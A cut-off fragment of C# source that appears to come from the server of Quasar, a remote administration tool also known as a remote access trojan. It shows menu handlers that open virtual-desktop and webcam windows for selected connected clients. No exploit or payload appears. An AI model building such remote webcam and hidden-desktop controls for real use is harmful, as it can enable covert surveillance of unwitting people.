...
namespace Quasar.Server.Forms
{
    public partial class FrmMain : Form
    {
        ...
        private void virtualDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count == 0) return;
            var selectedClients = GetSelectedClients();
            using (var frmVirtualDesktop = new FrmVirtualDesktop(selectedClients))
            {
                frmVirtualDesktop.ShowDialog();
            }
        }
        ...
        private void webcamToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count == 0) return;
            var selectedClients = GetSelectedClients();
            using (var frmWebcam = new FrmWebcam(selectedClients))
            {
